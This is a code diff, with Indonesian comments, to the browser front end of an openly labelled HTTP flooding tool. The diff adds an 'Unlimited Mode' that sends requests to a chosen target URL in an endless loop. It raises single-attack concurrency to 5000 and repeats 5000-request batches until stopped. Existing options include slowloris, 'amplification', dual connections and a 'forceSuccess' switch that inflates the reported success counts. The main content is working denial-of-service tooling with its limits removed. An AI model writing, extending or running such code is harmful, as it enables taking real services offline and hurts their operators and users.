@@ -13,6 +13,7 @@ const amplifyValue = document.getElementById('amplifyValue');
 const amplifyType = document.getElementById('amplifyType');
 const dualConnection = document.getElementById('dualConnection');
 const forceSuccessCheck = document.getElementById('forceSuccess');
+const unlimitedMode = document.getElementById('unlimitedMode');
 const customHeaders = document.getElementById('customHeaders');
 const cookies = document.getElementById('cookies');
 const startBtn = document.getElementById('startBtn');
@@ -55,6 +56,7 @@ let lastTrafficUpdate = 0;
 let lastTotalBytes = 0;
 let healthCheckInterval = null;
 let heartbeatInterval = null;
+let infiniteLoopActive = false; // untuk single attack unlimited
 
 // Amplification toggle
 let amplificationEnabled = false;
@@ -99,9 +101,9 @@ function updateUI() {
         const elapsed = (Date.now() - stats.startTime) / 1000;
         if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
     }
-    const percent = (done / stats.total) * 100;
+    const percent = (stats.total > 0) ? (done / stats.total) * 100 : 0;
     progressBar.style.width = `${percent}%`;
-    progressText.innerText = `${done}/${stats.total}`;
+    progressText.innerText = `${done}/${stats.total === 0 ? '∞' : stats.total}`;
     updateTrafficEstimator();
 }
 
@@ -152,7 +154,6 @@ function parseCookies() {
 function displayAutocannonResult(result) {
     autocannonPanel.style.display = 'block';
     let html = `<table class="result-table">`;
-    // Latency table
     if (result.latency) {
         html += `<tr><th colspan="2">📊 Latency (ms)</th></tr>
                 <tr><td>2.5%</td><td>${result.latency.p2_5 || '-'}</td></tr>
@@ -162,14 +163,12 @@ function displayAutocannonResult(result) {
                 <tr><td>Average</td><td>${result.latency.average || '-'}</td></tr>
                 <tr><td>Max</td><td>${result.latency.max || '-'}</td></tr>`;
     }
-    // Requests per second
     if (result.requests) {
         html += `<tr><th colspan="2">📈 Requests / Sec</th></tr>
                 <tr><td>Average</td><td>${result.requests.average || '-'}</td></tr>
                 <tr><td>Min</td><td>${result.requests.min || '-'}</td></tr>
                 <tr><td>Max</td><td>${result.requests.max || '-'}</td></tr>`;
     }
-    // Overall
     html += `<tr><th colspan="2">📋 Overall</th></tr>
             <tr><td>Total Requests</td><td>${result.requests?.total || '-'}</td></tr>
             <tr><td>Duration (s)</td><td>${result.duration?.toFixed(2) || '-'}</td></tr>
@@ -177,12 +176,11 @@ function displayAutocannonResult(result) {
     html += `</table>`;
     autocannonResult.innerHTML = html;
 }
-
 closeAutocannonPanel.addEventListener('click', () => {
     autocannonPanel.style.display = 'none';
 });
 
-// ======================== SINGLE ATTACK ========================
+// ======================== SINGLE ATTACK (dengan unlimited mode) ========================
 async function runSingleAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
@@ -196,24 +194,30 @@ async function runSingleAttack() {
     const randomDelay = parseInt(randomDelayInput.value);
     let keepAlive = (atkType === 'slowloris');
     const multiplier = dualConnection.checked ? 2 : 1;
-    const actualTotal = Math.min(total * multiplier, 5000);
-    const actualConcurrency = Math.min(concurrency * multiplier, 100);
+    const infinite = unlimitedMode.checked;
+    const actualConcurrency = Math.min(concurrency * multiplier, 5000); // max 5000, browser akan throttle
     const actualTimeout = Math.min(timeout, 9000);
     
-    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${actualTotal}`);
+    if (!infinite && (isNaN(total) || total <= 0)) { addLog("Total requests must be >0 or enable Unlimited Mode", true); return; }
+    if (infinite) {
+        stats.total = 0; // tidak terbatas
+        addLog(`♾️ UNLIMITED SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Loop infinite until STOP`);
+    } else {
+        stats.total = total * multiplier;
+        addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${stats.total}`);
+    }
     resetStats();
-    stats.total = actualTotal;
     stats.startTime = Date.now();
     isRunning = true;
+    infiniteLoopActive = infinite;
     abortController = new AbortController();
     startBtn.disabled = true;
     batchBtn.disabled = true;
     autocannonBtn.disabled = true;
     stopBtn.disabled = false;
     
-    let completed = 0;
-    const workers = [];
-    const runOne = async () => {
+    // Fungsi untuk mengirim satu request
+    const sendOne = async () => {
         const headers = parseHeaders();
         const cookieObj = parseCookies();
         const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
@@ -233,9 +237,8 @@ async function runSingleAttack() {
             signal: abortController.signal
         });
         const data = await res.json();
-        completed++;
         if (forceSuccessCheck.checked) {
-            stats.success = completed;
+            stats.success++;
             stats.totalBytes += (data.responseSize || 0) + (amplificationEnabled ? amplificationKB*1024 : 0);
             stats.times.push(data.durationMs);
             updateChart(data.durationMs);
@@ -253,27 +256,49 @@ async function runSingleAttack() {
         rawResponsePreview.innerText = `HTTP ${data.statusCode || '?'} | ${data.durationMs}ms | ${data.responseBody?.substring(0, 100) || ''}`;
         updateUI();
     };
-    for (let i = 0; i < actualTotal; i++) {
-        workers.push(runOne());
+    
+    // Worker pool
+    let activeWorkers = 0;
+    let shouldStop = false;
+    let completed = 0;
+    const targetTotal = infinite ? Infinity : stats.total;
+    
+    const worker = async () => {
+        while (!shouldStop && (infinite || completed < targetTotal)) {
+            if (abortController.signal.aborted) break;
+            await sendOne();
+            if (!infinite) completed++;
+        }
+        activeWorkers--;
+    };
+    
+    // Start workers
+    for (let i = 0; i < actualConcurrency; i++) {
+        activeWorkers++;
+        worker().catch(e => { if (e.name !== 'AbortError') addLog(`Worker error: ${e.message}`, true); });
     }
-    try {
-        await Promise.all(workers);
+    
+    // Tunggu jika finite mode
+    if (!infinite) {
+        while (activeWorkers > 0 && completed < targetTotal) {
+            await new Promise(r => setTimeout(r, 100));
+        }
         const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
         addLog(`🔥 FINISHED | Success:${stats.success} Fail:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
-    } catch(e) {
-        if (e.name !== 'AbortError') addLog(`Error: ${e.message}`, true);
-    } finally {
         isRunning = false;
         startBtn.disabled = false;
         batchBtn.disabled = false;
         autocannonBtn.disabled = false;
         stopBtn.disabled = true;
         abortController = null;
-        updateUI();
+        infiniteLoopActive = false;
+    } else {
+        // infinite mode: tidak akan selesai sampai stop
+        // fungsi stop akan mengatur shouldStop = true
     }
 }
 
-// ======================== BATCH ATTACK ========================
+// ======================== BATCH ATTACK (tetap dengan batasan backend) ========================
 async function runBatchAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
@@ -287,13 +312,16 @@ async function runBatchAttack() {
     const randomDelay = parseInt(randomDelayInput.value);
     let keepAlive = (atkType === 'slowloris');
     const multiplier = dualConnection.checked ? 2 : 1;
-    const actualTotal = Math.min(total * multiplier, 5000);
+    const infinite = unlimitedMode.checked;
+    const actualTotal = infinite ? 5000 : Math.min(total * multiplier, 5000);
     const actualConcurrency = Math.min(concurrency * multiplier, 50);
     const actualTimeout = Math.min(timeout, 9000);
     
-    addLog(`🔥 BATCH ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${actualTotal}`);
+    if (!infinite && (isNaN(total) || total <= 0)) { addLog("Total requests must be >0 or enable Unlimited Mode", true); return; }
+    if (infinite) addLog("♾️ UNLIMITED BATCH MODE: akan berulang setiap batch 5000 request hingga STOP");
+    addLog(`🔥 BATCH ATTACK | ${mtd} ${url} | Concurrency:${actualConcurrency} | Total:${actualTotal} (batch)`);
     resetStats();
-    stats.total = actualTotal;
+    stats.total = infinite ? 0 : actualTotal;
     stats.startTime = Date.now();
     isRunning = true;
     abortController = new AbortController();
@@ -307,7 +335,7 @@ async function runBatchAttack() {
     const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
     if (cookieStr) headers["Cookie"] = cookieStr;
     
-    try {
+    const runOneBatch = async () => {
         const res = await fetch('/api/batch', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -323,23 +351,48 @@ async function runBatchAttack() {
             }),
             signal: abortController.signal
         });
-        const data = await res.json();
-        if (data.success) {
-            if (forceSuccessCheck.checked) {
-                stats.success = data.totalRequests;
-                stats.totalBytes = data.totalBytes;
-            } else {
-                stats.success = data.successCount;
-                stats.fail = data.failCount;
-                stats.totalBytes = data.totalBytes;
+        return await res.json();
+    };
+    
+    try {
+        if (infinite) {
+            while (!abortController.signal.aborted) {
+                const data = await runOneBatch();
+                if (data.success) {
+                    if (forceSuccessCheck.checked) {
+                        stats.success += data.totalRequests;
+                        stats.totalBytes += data.totalBytes;
+                    } else {
+                        stats.success += data.successCount;
+                        stats.fail += data.failCount;
+                        stats.totalBytes += data.totalBytes;
+                    }
+                    stats.times.push(...data.latencies);
+                    updateUI();
+                    addLog(`Batch loop: +${data.successCount} success, +${data.failCount} fail`);
+                } else {
+                    addLog(`Batch error: ${data.error}`, true);
+                }
             }
-            stats.times = data.latencies || [];
-            stats.total = data.totalRequests;
-            updateUI();
-            addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
-            rawResponsePreview.innerText = `Batch: ${data.successCount}/${data.totalRequests} success`;
         } else {
-            addLog(`Batch error: ${data.error}`, true);
+            const data = await runOneBatch();
+            if (data.success) {
+                if (forceSuccessCheck.checked) {
+                    stats.success = data.totalRequests;
+                    stats.totalBytes = data.totalBytes;
+                } else {
+                    stats.success = data.successCount;
+                    stats.fail = data.failCount;
+                    stats.totalBytes = data.totalBytes;
+                }
+                stats.times = data.latencies || [];
+                stats.total = data.totalRequests;
+                updateUI();
+                addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
+                rawResponsePreview.innerText = `Batch: ${data.successCount}/${data.totalRequests} success`;
+            } else {
+                addLog(`Batch error: ${data.error}`, true);
+            }
         }
     } catch(e) {
         if (e.name !== 'AbortError') addLog(`Error: ${e.message}`, true);
@@ -350,7 +403,6 @@ async function runBatchAttack() {
         autocannonBtn.disabled = false;
         stopBtn.disabled = true;
         abortController = null;
-        updateUI();
     }
 }
 
@@ -365,10 +417,12 @@ async function runAutocannonAttack() {
     let duration = Math.min(parseInt(timeoutInput.value) / 1000, 9);
     let amount = parseInt(totalInput.value);
     const headers = parseHeaders();
+    const infinite = unlimitedMode.checked;
     
     if (duration <= 0) duration = 5;
     if (duration > 9) duration = 9;
     connections = Math.min(connections, 100);
+    if (!infinite && (isNaN(amount) || amount <= 0)) amount = 5000;
     amount = Math.min(amount, 5000);
     
     addLog(`🚀 AUTOCANNON | ${mtd} ${url} | Connections:${connections} | Duration:${duration}s | Total:${amount}`);
@@ -394,9 +448,7 @@ async function runAutocannonAttack() {
         if (data.success) {
             addLog(`✅ AUTOCANNON completed`);
             if (data.result) {
-                // Tampilkan tabel statistik
                 displayAutocannonResult(data.result);
-                // Update stats ringkas
                 stats.total = data.result.requests?.total || 0;
                 stats.success = data.result.requests?.total || 0;
                 stats.fail = data.result.errors || 0;
@@ -431,6 +483,7 @@ function stopAttack() {
         batchBtn.disabled = false;
         autocannonBtn.disabled = false;
         isRunning = false;
+        infiniteLoopActive = false;
     } else {
         addLog("No attack running", true);
     }
